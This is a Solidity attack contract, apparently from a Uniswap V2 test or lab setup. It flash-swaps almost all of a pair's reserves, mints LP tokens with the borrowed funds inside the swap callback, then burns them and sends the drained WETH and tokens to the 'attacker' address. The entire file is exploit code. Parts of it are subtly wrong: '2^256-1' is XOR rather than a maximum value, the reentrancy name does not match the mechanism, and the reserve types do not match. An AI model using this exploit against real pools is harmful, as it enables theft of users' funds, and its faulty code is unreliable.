pragma solidity ^0.8.0;

import {IUniswapV2Pair} from "../contracts/core/interfaces/IUniswapV2Pair.sol"; // Import Uniswap V2 pair interface
import {IERC20} from "../contracts/core/interfaces/IERC20.sol"; // Import ERC20 standard interface

contract AttackForReentrancy{
    IUniswapV2Pair uniswapV2Pair; // Uniswap V2 pair
    IERC20 weth; // ERC20 interface representing WETH
    IERC20 token; // ERC20 interface for another token
    IERC20 LPToken; // Liquidity token of the Uniswap V2 pair
    address public attacker; // Attacker's address
    address public uniswapV2PairAddress; // Address of the Uniswap V2 pair
    address public wethAddress; // Address of the WETH token
    address public tokenAddress; // Address of the other token

    constructor(address _uniswapV2Pair,address _weth,address _token) {
        weth=IERC20(_weth); // Initialize WETH token interface
        token=IERC20(_token); // Initialize other token interface
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair); // Initialize Uniswap V2 pair
        uniswapV2PairAddress=_uniswapV2Pair; // Set Uniswap V2 pair address
        wethAddress=_weth; // Set WETH token address
        tokenAddress=_token; // Set other token address 
        LPToken=IERC20(_uniswapV2Pair); // Initialize liquidity token interface of Uniswap V2 pair
        attacker = msg.sender; // Set attacker address to contract creator
        weth.approve(attacker,2^256-1); // Approve attacker for unlimited WETH transfer
        token.approve(attacker,2^256-1); // Approve attacker for unlimited transfer of other token
        weth.approve(uniswapV2PairAddress,2^256-1); // Approve Uniswap V2 pair for unlimited WETH transfer
        token.approve(uniswapV2PairAddress,2^256-1); // Approve Uniswap V2 pair for unlimited transfer of other token
    }

    function exploit() public payable { // Public method for exploitation, needs to send some ETH
        require(msg.sender == attacker, "Not an attacker"); // Only attacker can call
        payable(wethAddress).call{value:address(this).balance}(abi.encodeWithSignature("deposit()", "")); // Call WETH deposit to wrap ETH to WETH
        uniswapV2Pair.sync(); // Sync reserves of Uniswap V2 pair
        (uint reserve0,uint reserve1,uint blocktimestamp)=uniswapV2Pair.getReserves(); // Get reserves and timestamp of Uniswap V2 pair
        uniswapV2Pair.swap(reserve0-1, reserve1-1, address(this), "attack"); // Trade on Uniswap V2 pair
    }

    // Attack idea is to mint LP with flash loaned funds, get large amount of LP, repay loan, then remove liquidity to drain more tokens from the pool
    function uniswapV2Call(
        address, /* sender */
        uint amount0,
        uint amount1,
        bytes calldata /* data */
    ) external { // Callback of Uniswap V2 pair
        address token0InPair=uniswapV2Pair.token0(); // Get first token in Uniswap V2 pair
        require(msg.sender == uniswapV2PairAddress); // Caller must be Uniswap V2 pair
        uniswapV2Pair.sync(); // Sync reserves of Uniswap V2 pair
        if(token0InPair==wethAddress){ // If first token is WETH
            weth.transfer(uniswapV2PairAddress, amount0); // Return WETH
            token.transfer(uniswapV2PairAddress, amount1); // Return other token
        }
        else{ // Otherwise 
            weth.transfer(uniswapV2PairAddress, amount1); // Return WETH
            token.transfer(uniswapV2PairAddress, amount0); // Return other token
        }
        
        uniswapV2Pair.mint(address(this)); // Mint new liquidity tokens
        
        if(token0InPair==wethAddress){ // If first token is WETH
            weth.transfer(uniswapV2PairAddress, amount0/10); // Return more WETH
        }
        else{ // Otherwise
            weth.transfer(uniswapV2PairAddress, amount1/10); // Return more WETH
        }
    }

    function withdraw() public{ // Public method to withdraw funds after attack
        require(msg.sender==attacker); // Only attacker can call
        LPToken.transfer(uniswapV2PairAddress,LPToken.balanceOf(address(this))); // Transfer all liquidity tokens to Uniswap V2 pair
        uniswapV2Pair.burn(address(this)); // Burn liquidity tokens
        weth.transfer(attacker,weth.balanceOf(address(this))); // Transfer all WETH to attacker
        token.transfer(attacker,token.balanceOf(address(this))); // Transfer all other tokens to attacker
    }
}
